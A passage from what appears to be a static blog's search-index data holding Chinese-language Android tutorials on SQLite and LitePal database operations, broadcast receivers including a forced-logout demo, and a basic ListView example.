autoincrement,&quot; +&quot;author text,&quot; +&quot;price real,&quot; +&quot;pages integer,&quot; +&quot;name text)&quot;; private Context mContext; public MydatabaseHelper(@Nullable Context context, @Nullable String name, @Nullable SQLiteDatabase.CursorFactory factory, int version) &#123; super(context, name, factory, version); mContext=context; &#125; @Override public void onCreate(SQLiteDatabase db) &#123; db.execSQL(CREATE_BOOK); Toast.makeText(mContext,&quot;创建成功&quot;,Toast.LENGTH_SHORT).show(); &#125; @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) &#123; &#125; &#125; private MydatabaseHelper dbhelper; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //实例化该自动创建的对象 dbhelper=new MydatabaseHelper(this,&quot;BookStore&quot;,null,1); Button createDatabase=(Button) findViewById(R.id.button_re); createDatabase.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; dbhelper.getWritableDatabase(); &#125; &#125;); &#125;&#125; 主要语句： 1234public void onCreate(SQLiteDatabase db) &#123; db.execSQL(CREATE_BOOK); Toast.makeText(mContext,&quot;创建成功&quot;,Toast.LENGTH_SHORT).show(); &#125; 主要建表语句，子啊onCreate( )方法中调用SQLiteDatabase的execSQL( )的方法去执行语句，并且弹出一个创建成功的语句 用DB browser查看 升级数据库(对数据库进行加表操作) 1234public static final String CREATE_CATEGORY=&quot;create table Category (&quot; +&quot;id integer primary key autoincrement, &quot; +&quot;category_name text, &quot; +&quot;category_code integer)&quot;; 再增加一句SQL语句，增加第二个名为Category的表 如果直接再onCreate( )方法中使用此代码 12345public void onCreate(SQLiteDatabase db) &#123; db.execSQL(CREATE_BOOK); db.execSQL(CREATE_CATEGORY); Toast.makeText(mContext,&quot;创建成功&quot;,Toast.LENGTH_SHORT).show();&#125; 此时是没有任何反应的，因为如果此时BookStore.db已经存再了，该语句已经不会再执行，此时只能在onUpgrade( )语句中再加入 12345public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) &#123; db.execSQL(&quot;drop table if exists Book&quot;); db.execSQL(&quot;drop table if exists Category&quot;); onCreate(db);&#125; 在onUpgrade( )语句中执行了两条DROP语句，如果发现数据库中已经存在Book表或者Category表，就把两张然后调用onCreate( )中的语句，进行一次重新建表的操作 1234567891011121314private MydatabaseHelper dbhelper;@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); dbhelper=new MydatabaseHelper(this,&quot;BookStore&quot;,null,2); Button createDatabase=(Button) findViewById(R.id.button_re); createDatabase.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; dbhelper.getWritableDatabase(); &#125; &#125;); 关键语句应该在实例化的操作中将该构造函数的1改为2，只要比1大就能执行onUpgrade( )中的语句 对表进行CRUD操作 增加数据前面已经知道SQLiteOpenHelper的getReadableDatabase( )或getWritableDatabase( )方法是可以返回一个SQLiteDatabase( )对象，借助这个对象可以对数据进行各种操作。 SQLiteDatabase中提供了一个insert( )方法，这个方法专门用于添加数据，接收三个参数 db.insert(&quot;Book&quot;,null,values); 第一个参数是表名，第二个参数用于未指定添加数据的情况下给某些可为空的列自动赋值为NULL，一般传null，第三个是一个ContentValues对象，提供一系列的put( )方法重载，用于向ContentValues添加数据，只需要将表中的每个列名以及相应的待添加数据传入即可。 12345678SQLiteDatabase db=dbhelper.getWritableDatabase();ContentValues values=new ContentValues();values.put(&quot;name&quot;, &quot;蔡徐坤的人生&quot;);values.put(&quot;author&quot;,&quot;caixukun&quot;);values.put(&quot;pages&quot;,444);values.put(&quot;price&quot;,17);db.insert(&quot;Book&quot;,null,values);Toast.makeText(MainActivity.this,&quot;添加数据成功&quot;,Toast.LENGTH_SHORT).show(); 修改数据db.update(&quot;Book&quot;,values,&quot;name=?&quot;,new String[]&#123;&quot;蔡徐坤的人生&quot;&#125;); 修改数据主要通过db.updata( )该方法进行操作，第一个参数是表名；第二个参数ContentValues对象，用put( )传入要修改的数据；第三个参数相当于SQL语句的WHERE,主要用来找列，该方法找的是name这列，问号相当于一个占位符，供给第四个参数使用；第四参数就是一个字符串 12345678910mod_data.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; SQLiteDatabase db=dbhelper.getWritableDatabase(); ContentValues values=new ContentValues(); values.put(&quot;price&quot;,10); db.update(&quot;Book&quot;,values,&quot;name=?&quot;,new String[]&#123;&quot;蔡徐坤的人生&quot;&#125;); Toast.makeText(MainActivity.this,&quot;修改数据成功&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125;); 删除数据db.delete(&quot;Book&quot;,&quot;pages &gt; ?&quot;,new String[]&#123;&quot;500&quot;&#125;); 删除数据主要通过db.delete( )方法进行一个操作，第一个参数是表名，第二个参数是条件，跟修改数据差不多是为了找到数据条的位置 123456789delete_data.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; SQLiteDatabase db=dbhelper.getWritableDatabase(); db.delete(&quot;Book&quot;,&quot;pages &gt; ?&quot;,new String[]&#123;&quot;500&quot;&#125;); Toast.makeText(MainActivity.this,&quot;删除数据成功&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125;); 查询数据SQLiteDatabase中提供了一个query( )方法用于对数据进行查询，这个方法的参数非常复杂，最短的一个方法重载也需要传入7个参数。 第一个参数表名； 第二个参数指定用于查询哪几列，如果不指定则默认查询所有列； 第三、第四个参数用于约束查询某一行或某几行的数据，不指定则默认查询所有的行数据； 第五个参数用于指定需要group by的列，不指定则表示不对查询结果进行group by操作； 第七个参数用于指定查询结果的排列方式，不指定则表示使用默认的排序方式 调用query( )方法会返回一个Cursor对象，查询到所有的数据都将从这个对象中取出 12345678910111213141516171819query_data.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; SQLiteDatabase db=dbhelper.getWritableDatabase(); Cursor cursor=db.query(&quot;Book&quot;,null,null,null,null,null,null); if(cursor.moveToFirst())&#123; do&#123; String id=cursor.getString(cursor.getColumnIndex(&quot;id&quot;)); String author=cursor.getString(cursor.getColumnIndex(&quot;author&quot;)); String price=cursor.getString(cursor.getColumnIndex(&quot;price&quot;)); String pages=cursor.getString(cursor.getColumnIndex(&quot;pages&quot;)); String name=cursor.getString(cursor.getColumnIndex(&quot;name&quot;)); Toast.makeText(MainActivity.this,id+&quot; &quot;+author+&quot; &quot;+price+&quot; &quot;+pages+&quot; &quot;+name,Toast.LENGTH_SHORT).show(); &#125;while (cursor.moveToNext()); &#125; cursor.close(); &#125;&#125;); 首先获取一个SQLiteDatabase对象，然后使用db.query( )方法将数据存在一个Cursor对象，最后对Cursor进行处理， cursor.moveToFirst( )方法将指针移到第一个数据，cursor.getString(cursor.getColumnIndex(&quot;id&quot;))获取数据是列索引为id的数据，一行一行去读数据通过方法cursor.moveToNext()实现，最后 cursor.close()关闭该对象 使用SQL语言操作数据库 使用LitePal操作数据库LitePal是一款开源的Android数据库框架,它采用了对象关系映射(ORM)的模式,并将我们平时开发最常用到的一些数据库功能进行了封装,使得不用编写一行SQL语句就可以完成各种建表和增删改查的操作，并且LitePal很“轻”，jar包大小不到100k，而且近乎零配置，这一点和Hibernate这类的框架有很大区别。 1.添加依赖 在app/build.gradle文件中添加依赖 123dependencies &#123; implementation &#x27;org.litepal.guolindev:core:3.2.2&#x27;&#125; 然后在主注册文件中&lt;application&gt;标签内添加一行 1android:name=&quot;org.litepal.LitePalApplication&quot; 在assets目录下创建一个litepal.xml配置文件 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;litepal&gt; &lt;dbname value=&quot;demo&quot; /&gt; &lt;version value=&quot;1&quot; /&gt; &lt;list&gt; &lt;mapping class=&quot;com.example.litepaltest.Album&quot; /&gt; &lt;mapping class=&quot;com.example.litepaltest.Song&quot; /&gt; &lt;/list&gt;&lt;/litepal&gt; verson为版本号，若对数据表的结构有进行更新的话，添加版本号1-&gt;2，list中为两个数据表，路径一定要搞对， 最后在活动的创建中加入一行 1LitePal.initialize(this); 2.创建实体类，一般继承LitePalSupport，不能包含List类型的属性 litepal支持的实体类字段映射类型为 int，long，double，float，byte[]，boolean，String，Date；不支持String[]数组型1234567891011121314151617181920public class Movie extends LitePalSupport&#123; private int id; //name是唯一的，且默认值为unknown @Column(unique = true, defaultValue = &quot;unknown&quot;) private String name; //忽略即 不在数据库中创建该属性对应的字段 @Column(ignore = true) private float price; private byte[] cover; private int duration; //不为空 @Column(nullable = false) private String director; private String type; //记得添加所有字段的getter和setter方法 &#125; 其中id这个字段可写可不写，因为即使不写这个字段，LitePal也会在表中自动生成一个id列，毕竟每张表都一定要有主键的， 即不管实体类中有没有id这个属性，都会默认创建一个为整型的id字段，作为自增的主键。 3.存储操作 实例一个对象，然后对象进行一个赋值，最后用对象.save( )方法进行一个保存。 123456album.save();Song song1 = new Song();song1.setName(&quot;song1&quot;);song1.setDuration(320);song1.setAlbum(album);song1.save(); 4.删除操作 12345678// 删除单个记录，id=1LitePal.delete(Movie.class,1);//删除数据库中movie表的所有记录 LitePal.deleteAll(Movie.class); //删除数据库movie表中duration大于3500的记录 LitePal.deleteAll(Movie.class, &quot;duration &gt; ?&quot; , &quot;3500&quot;); 5.修改操作 123456//第一步，查找id为1的记录 Movie movie = LitePal.find(Movie.class, 1); //第二步，改变某个字段的值 movie.setPrice(4020f); //第三步，保存数据 movie.save(); 12345Movie movie=new Movie(); movie.setName(&quot;2Diots&quot;); movie.setDirector(&quot;某人&quot;); //直接更新id为1的记录 movie.update(1); 12345678910Movie movie=new Movie(); movie.setDirector(&quot;someone&quot;); //更新所有name为2Diots的记录,将director字段设为someone movie.updateAll(&quot;name = ?&quot;, &quot;2Diots&quot;);Movie movie=new Movie(); movie.setName(&quot;someone&quot;); movie.setDirector(&quot;someone&quot;); //将更新所有name为2Diots，director为gpf的记录name和director均改为someonemovie.updateAll(&quot;name=? and director=?&quot;, &quot;2Diots&quot;，&quot;gpf&quot;); 6.查询操作 12345678910111213141516171819202122232425262728293031323334//查找movie表的所有记录，返回值是一个泛型为Movie的List集合List&lt;Movie&gt; allMovies = LitePal.findAll(Movie.class); //查找movie表id为1的记录 Movie movie = LitePal.find(Movie.class,1); // 比如获取news表中的第一条数据News firstNews = LitePal.findFirst(News.class);// 获取News表中的最后一条数据News lastNews = LitePal.findLast(News.class);// 想把news表中id为1、3、5、7的数据都查出来List&lt;News&gt; newsList = LitePal.findAll(News.class, 1, 3, 5, 7);// 或者long[] ids = new long[] &#123; 1, 3, 5, 7 &#125;;List&lt;News&gt; newsList = LitePal.findAll(News.class, ids);//查找name为2Diots的记录,并且以时长作排序，where()方法接收任意个字符串参数，其中第一个参数用于进行条件约束，//从第二个参数开始，都是用于替换第一个参数中的占位符的。那这个where()方法就对应了一条SQL语句中的where部分。 List&lt;Movie&gt; movies = LitePal.where(&quot;name = ?&quot;, &quot;2Diots&quot;).order(&quot;duration&quot;).find(Movie.class); // 但是这样会将news表中所有的列都查询出来，也许你并不需要那么多的数据，而是只要title和content这两列数据。那么也很简单，我们只要再增加一个连缀就行了，如下所示：List&lt;News&gt; newsList = LitePal.select(&quot;title&quot;, &quot;content&quot;).where(&quot;commentcount &gt; ?&quot;, &quot;0&quot;).find(News.class);//将查询出的新闻按照发布的时间倒序排列，即最新发布的新闻放在最前面，那就可以这样写：List&lt;News&gt; newsList = LitePal.select(&quot;title&quot;, &quot;content&quot;).where(&quot;commentcount &gt; ?&quot;, &quot;0&quot;).order(&quot;publishdate desc&quot;).find(News.class);//order()方法中接收一个字符串参数，用于指定查询出的结果按照哪一列进行排序，asc表示正序排序，desc表示倒序排序，因此order()方法对应了一条SQL语句中的order by部分。//也许你并不希望将所有条件匹配的结果一次性全部查询出来，因为这样数据量可能会有点太大了，而是希望只查询出前10条数据，那么使用连缀同样可以轻松解决这个问题，代码如下所示：List&lt;News&gt; newsList = LitePal.select(&quot;title&quot;, &quot;content&quot;).where(&quot;commentcount &gt; ?&quot;, &quot;0&quot;).order(&quot;publishdate desc&quot;).limit(10).find(News.class);//limit()方法接收一个整型参数，用于指定查询前几条数据，这里指定成10，意思就是查询所有匹配结果中的前10条数据。//刚才我们查询到的是所有匹配条件的前10条新闻，那么现在我想对新闻进行分页展示，翻到第二页时，展示第11到第20条新闻,只需要再连缀一个偏移量就可以了，如下所示：List&lt;News&gt; newsList = LitePal.select(&quot;title&quot;, &quot;content&quot;).where(&quot;commentcount &gt; ?&quot;, &quot;0&quot;).order(&quot;publishdate desc&quot;).limit(10).offset(10).find(News.class);//这里指定成10，就表示偏移十个位置，那么原来是查询前10条新闻的，偏移了十个位置之后，就变成了查询第11到第20条新闻了，如果偏移量是20，那就表示查询第21到第30条新闻//查找所有年龄小于25岁的人List&lt;Person&gt; person = LitePal.where(&quot;age &lt; ?&quot;, 25).find(Person.class);","categories":[],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android-广播机制","slug":"Android/Android-广播机制","date":"2020-09-24T10:47:35.000Z","updated":"2021-04-01T13:45:20.000Z","comments":true,"path":"2020/09/24/Android/Android-广播机制/","link":"","permalink":"http://example.com/2020/09/24/Android/Android-%E5%B9%BF%E6%92%AD%E6%9C%BA%E5%88%B6/","excerpt":"","text":"广播机制标准广播 标准广播是一种完全异步执行的而广播，在广播发出之后，所有的广播接收器几乎都在同一个时候接受到这条广播消息，因此它们之前没有任何先后顺序，这种广播的效率都会比较高，但同时也意味同时无法截断。 有序广播 有序广播是一种同步执行的广播，在广播发出之后，同一个时候只有一个广播接收器能够收到这个条广播消息，当这个广播接收器中的逻辑执行完毕后，广播才会继续传递。此时接收器是有先后顺序，优先级高德广播接收器可以先收到广播消息，并且前面的广播接收器还可以截断正在进行传递的广播。 接收系统广播Android内置了很多系统界别的广播，在应用程序中通过监听这些广播来得到各种系统的状态信息，比如手机开机完成后发出一条广播，电池的变量发生变化会发出一条广播等等，如果想要接受这些广播，就需要使用广播接受器。 动态注册监听网络变化广播接收器可以自由地对自己感兴趣的广播进行注册，这样当有相应的广播发出时，广播接收器就能够接收到该广播，并在内部处理相应的逻辑，注册广播的方式有两种 1.在代码中注册·····动态注册 2.在AndroidManifest.xml中注册····静态注册 创建广播接收器 1.创建一个类，继承BroadcastReceiver 2.重写父类的onReceive( )方法 动态注册监听网络变化 123456789101112131415161718192021222324252627282930313233343536373839404142package com.example.temp;import androidx.appcompat.app.AppCompatActivity;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.content.IntentFilter;import android.icu.text.UnicodeSetSpanner;import android.os.Bundle;import android.widget.Toast;public class MainActivity extends AppCompatActivity &#123; private IntentFilter intentFilter; //新建一个广播接收器 private NetworkChangeReceiver networkChangeReceiver; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);、 //新建一个IntentFilter intentFilter=new IntentFilter(); intentFilter.addAction(&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;); networkChangeReceiver=new NetworkChangeReceiver(); //注册广播（一个变量是广播接收器类，一个是信息类） registerReceiver(networkChangeReceiver,intentFilter); &#125; @Override protected void onDestroy()&#123; super.onDestroy(); unregisterReceiver(networkChangeReceiver); &#125; //新建一个类继承在广播接收器 class NetworkChangeReceiver extends BroadcastReceiver&#123; @Override public void onReceive(Context context, Intent intent)&#123; Toast.makeText(context,&quot;网络改变&quot;, Toast.LENGTH_LONG).show(); &#125; &#125;&#125; 1、首先在MainActivity中定义了一个内部类NetworkChangeReceiver，这个类是继承自BroadcastReceiver的，并重写父类的onReceiver( )方法，这样每当网络状态改变时，onReceiver( )方法就会得到执行，这里只是简单地使用Toast提示了一段文本信息 2、观察onCreate( )方法，创建了一个IntentFilter的实例，并添加一个值为android.net.conn.CONNECTIVITY_CHANGE的action，添加这个值原因是刚好系统发出的是值相同的一条广播，需要监听什么广播就添加什么样的action 3、接下来创建了一个NetwordkChangeReceiver的实例和IntenFilter的实例都传了进去，这样NetworkChangeReceiver就会收到所有值为android.net.conn.CONNECTIVITY_CHANG的广播，也就实现了监听网络变化的功能 4.最后动态注册的广播接收通过onDestroy( )方法中调用unregisterReceiver( )来实现 需要加入访问权限才能访问系统的网络状态 1&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; 静态注册实现开机启动com.example.名称包新建个广播接收器 修改其中的代码 123456789public class MyReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; // TODO: This method is called when the BroadcastReceiver is receiving // an Intent broadcast. Toast.makeText(context,&quot;启动完成&quot;,Toast.LENGTH_LONG).show(); &#125;&#125; 只是在onReceive( )方法中使用了Toast弹出一段提示消息 静态广播的接收器需要在AndroidManifest.xml文件注册才可以使用， 12345678&lt;receiver android:name=&quot;.MyReceiver&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 包括加入权限 1&lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt; 发送自定义广播在发送广播之前，需要先定义一个广播接收器来接收此广播接收器来接收此广播，此次使用的静态注册的方式来使用广播接收器 首先在others选择新建一个MyBroadcastReceiver继承BroadcastReceiver，重写里面的onReceiver( )方法,即收到该方法会实行什么操作，在里面的代码我们加入的是一条Toast 123456public class MyBroadcastReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; Toast.makeText(context,&quot;接收到该广播&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125; 在AndroidManifest.xml中为该receiver类一个action广播消息，该广播消息自定义，这个类主要接受的就是这个action 12345678&lt;receiver android:name=&quot;.MyBroadcastReceiver&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.example.broadcasttest.MY_BROADCAST&quot;/&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 在activit_main.xml中写一个按钮，然后在点击事件中添加个Intent 1234public void onClick(View v) &#123; Intent intent =new Intent(&quot;com.example.broadcasttest.MY_BROADCAST&quot;); sendBroadcast(intent);&#125; 发送有序广播广播是一种可以跨进程的通信方式，因此在我们应用程序内发出的广播，其他的应用程序也是可以收到的,创建第二个项目，在该项目中也定义一个广播接收器 12345678910111213141516package com.example.broadcasttest2;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.widget.Toast;public class AnotherBroadcastReceiver extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; // TODO: This method is called when the BroadcastReceiver is receiving // an Intent broadcast. Toast.makeText(context,&quot;在另一个广播接收器中接收&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125; 12345678&lt;receiver android:name=&quot;.AnotherBroadcastReceiver&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.example.broadcasttest.MY_BROADCAST&quot;/&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 打开第一个程序，点击按钮，可以在程序收到两条Toast 此时上面定义注册都是标准广播 此时打开第一个程序，在该程序修改代码： 1234public void onClick(View v) &#123; Intent intent =new Intent(&quot;com.example.broadcasttest.MY_BROADCAST&quot;); sendOrderedBroadcast(intent,null); &#125; 相比第一个代码此时的sendBroadcast( )方法改成了sendOrdereBroadcast( )方法，sendOrderedBroadCast( )方法接收两个参数，第一个参数任何是Intent，第二个参数是一个与权限相关的字符串，这里传入null，此时点击按钮，两个程序仍可以接受到这条广播 首先设定广播的优先级，在AndroidManifest.xml代码中加入 123&lt;intent-filter android:priority=&quot;100&quot;&gt; &lt;action android:name=&quot;com.example.broadcasttest.MY_BROADCAST&quot;/&gt;&lt;/intent-filter&gt; 通过android:priority属性给广播接收器设置了优先级，优先级比较高的广播接收器就可以先收到广播，这里将第一个程序的广播接收器设置为100，以保证它一定会在第二个广播接收器之前收到广播，同时在第一个广播接收器类中的onReceiver中的代码加入 1abortBroadcast(); 可以看到在onReceiver( )方法中调用了abortBroadcast( )方法，就表示将这条广播截断，后面的广播接收器将无法接受到这条广播，重新点击按钮，发现只有第一个程序能接受到该广播 使用本地广播前面发送和接收的广播全属于系统全局广播，即发出的广播可以被其他任何程序接受，并且也可以接受来自其他任何程序的广播，这样很容易引起安全问题。 使用本地广播机制，此时就能够只在程序内部进行一个传递，并且广播接收器也只能接受来自本应用程序发出的广播，本地广播的用法并不复杂，主要就是使用了一个LocalBroadcastManager来对广播进行管理，并提供了发送广播和注册广播接收器的方法 使用动态注册广播 12345678910111213141516171819202122232425262728293031public class MainActivity extends AppCompatActivity &#123; private IntentFilter intentFilter; private LocalReceiver localReceiver; private LocalBroadcastManager localBroadcastManager; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); localBroadcastManager=LocalBroadcastManager.getInstance(this); Button button=(Button) findViewById(R.id.button); button.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Intent intent =new Intent(&quot;com.example.broadcasttest.MY_BROADCAST&quot;);// sendBroadcast(intent); localBroadcastManager.sendBroadcast(intent); &#125; &#125;); intentFilter=new IntentFilter(); intentFilter.addAction(&quot;com.example.broadcasttest.MY_BROADCAST&quot;); localReceiver=new LocalReceiver(); localBroadcastManager.registerReceiver(localReceiver,intentFilter); //注册本地的一个监听器 &#125; class LocalReceiver extends BroadcastReceiver&#123; @Override public void onReceive(Context context,Intent intent)&#123; Toast.makeText(context,&quot;received local broadcast&quot;,Toast.LENGTH_SHORT).show(); &#125; &#125;&#125; 需要在build.gradle中加入 1compile &#x27;com.android.support:support-v4:4.4.1&#x27; 才能使用 private LocalReceiver localReceiver;这部分主要使用的是LocalBroadcastManager来对广播进行的管理， 代码可以看到继承BroadcastReceiver的LocalReceiver中，写了一个Toast 1localBroadcastManager=LocalBroadcastManager.getInstance(this); 先通过LocalBroadcastManger的getInstance( )方法得到它的一个实例，然后再注册广播接收器时调用的是LocalBroadcastManger的registerReceiver( )方法，在发送广播时调用的是LocalBroadcastManger的sendBroadcast( )方法 在点击事件中添加了action为:com.example.broadcasttest.MY_BROADCAST的一个intentfilter，由于在LocalReceiver类中已经重写了该类，所以已经可以去接收广播了 实例:通过广播实现强制下线功能首先新建一个活动管理器，当有活动创建时，就把活动添加到活动管理器，调用活动管理器可以关掉所有的活动 12345678910111213141516public class ActicityCollector &#123; public static List&lt;Activity&gt; activities= new ArrayList&lt;&gt;(); public static void addActivity(Activity activity)&#123; activities.add(activity); &#125; public static void removeActivity(Activity activity)&#123; activities.remove(activity); &#125; public static void finshAll()&#123; for(Activity activity:activities)&#123; if(!activity.isFinishing())&#123; activity.finish(); &#125; &#125; &#125;&#125; 新建一个BaseActivity类作为所有活动的父类，代码如下： 1234567891011121314public class BaseActivity extends AppCompatActivity &#123; private ForceOfflineReceiver receiver; @Override protected void onCreate(Bundle savedInstanceState)&#123; super.onCreate(savedInstanceState); ActicityCollector.addActivity(this); &#125; @Override protected void onDestroy()&#123; super.onDestroy(); ActicityCollector.removeActivity(this); &#125;&#125; 前两个方法onCreate( )方法和onDestroy( )方法其中两个方法，在onCreate( )方法调用活动管理器添加活动，onDestroy( ) 在活动结束的时候删除活动管理器中的类 在activity_login.xml的布局文件中添加两个编辑框以及一个按钮 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;LinearLayout android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;LinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;60dp&quot; android:orientation=&quot;horizontal&quot;&gt; &lt;TextView android:layout_width=&quot;90dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_gravity=&quot;center_vertical&quot; android:text=&quot;用户名:&quot; android:textSize=&quot;18sp&quot; /&gt; &lt;EditText android:id=&quot;@+id/account&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_gravity=&quot;center_vertical&quot; android:layout_weight=&quot;1&quot; /&gt; &lt;/LinearLayout&gt; &lt;LinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;60dp&quot; android:orientation=&quot;horizontal&quot;&gt; &lt;TextView android:layout_width=&quot;90dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_gravity=&quot;center_vertical&quot; android:text=&quot;密码:&quot; android:textSize=&quot;18sp&quot; /&gt; &lt;EditText android:id=&quot;@+id/password&quot; android:layout_width=&quot;0dp&quot; android:layout_height=&quot;wrap_content&quot; android:layout_gravity=&quot;center_vertical&quot; android:layout_weight=&quot;1&quot; /&gt; &lt;/LinearLayout&gt; &lt;Button android:id=&quot;@+id/login&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;60dp&quot; android:text=&quot;登录&quot; /&gt;&lt;/LinearLayout&gt; 然后基于BaseActivity这个基类创建一个登陆的派生类，判断登陆的信息，跳转到主活动，同时把这个登陆类在注册文件中设置为启动活动 12345678910111213141516171819202122232425262728public class LoginActivity extends AppCompatActivity &#123; private EditText accountEdit; private EditText passwordEdit; private Button login; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_login); accountEdit=(EditText) findViewById(R.id.account); passwordEdit=(EditText) findViewById(R.id.password); login=(Button) findViewById(R.id.login); login.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; String account=accountEdit.getText().toString(); String password=passwordEdit.getText().toString(); if(account.equals(&quot;admin&quot;)&amp;&amp;password.equals(&quot;123&quot;))&#123; Intent intent =new Intent(LoginActivity.this,MainActivity.class); startActivity(intent); finish(); &#125;else&#123; Toast.makeText(LoginActivity.this,&quot;账号或者密码错误&quot;,Toast.LENGTH_SHORT).show(); &#125; &#125; &#125;); &#125;&#125; 注册文件： 123456&lt;activity android:name=&quot;.LoginActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; &lt;/intent-filter&gt;&lt;/activity&gt; 动态注册 123456789101112131415public class MainActivity extends BaseActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button forceOffline=(Button) findViewById(R.id.force_offline); forceOffline.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Intent intent=new Intent(&quot;com.example.broadcastbestpractice.FOR_OFFLINE&quot;); sendBroadcast(intent); &#125; &#125;); &#125;&#125; 在按钮事件发送了一条广播 接下来需要做的是创建一个广播接收器，由于所有窗口都应该有这个广播接收然进行强制下线的一个操作，所以这个强制下线的操作应该是写在广播接收器，然后这个广播接收器写在所有窗口的基类，这样接收到广播之后，不管任何窗口都能进行一个响应，如果创建的是一个静态注册的广播接收器，是没有办法在子进程onReceiv( )控制UI控件 1234567891011121314151617181920212223242526272829303132333435@Overrideprotected void onResume()&#123; super.onResume(); IntentFilter intentFilter=new IntentFilter(); intentFilter.addAction(&quot;com.example.broadcastbestpractice.FOR_OFFLINE&quot;); receiver=new ForceOfflineReceiver(); registerReceiver(receiver,intentFilter);&#125;@Overrideprotected void onPause()&#123; super.onPause(); if(receiver!=null)&#123; unregisterReceiver(receiver); receiver=null; &#125;&#125;class ForceOfflineReceiver extends BroadcastReceiver&#123; @Override public void onReceive(final Context context , Intent intent)&#123; AlertDialog.Builder builder=new AlertDialog.Builder(context); builder.setTitle(&quot;警告&quot;); builder.setMessage(&quot;你被强制下线，请重新登录一次&quot;); builder.setCancelable(false); builder.setPositiveButton(&quot;OK&quot;, new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int which) &#123; ActicityCollector.finshAll(); Intent intent=new Intent(context,LoginActivity.class); context.startActivity(intent); &#125; &#125;); builder.show(); &#125;&#125; 重写onCreate( )和onDestroy( )方法里来注册和取消广播器，但是这次我们要求的时只有处于栈顶的活动才能接受到这条强制下线的的广播，非栈顶的活动不应该也没必要去接收这条广播","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android-ListView控件","slug":"Android/Android-ListView控件","date":"2020-09-22T15:41:33.000Z","updated":"2021-03-05T08:16:02.000Z","comments":true,"path":"2020/09/22/Android/Android-ListView控件/","link":"","permalink":"http://example.com/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/","excerpt":"","text":"1.简单应用布局文件： 12345678&lt;LinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;ListView android:id=&quot;@+id/list_view&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;/&gt;&lt;/LinearLayout&gt; 在MainAcivity.java 1234567891011public class MainActivity extends AppCompatActivity &#123; private String data[]=&#123;&quot;APPLE&quot;,&quot;HUAWEI&quot;,&quot;XIAOMI&quot;,&quot;MEIZU&quot;,&quot;ZHONGXING&quot;,&quot;LENOVO&quot;&#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); ArrayAdapter&lt;String&gt;adapter=new ArrayAdapter&lt;String&gt;(MainActivity.this,android.R.layout.simple_list_item_1,data); ListView listView=(ListView) findViewById(R.id.list_view); listView.setAdapter(adapter); &#125;&#125; 运行结果 首先定义了一个字符串数组存数据，数组中的数据是无法直接传递给ListView的，仍然需要借助适配器 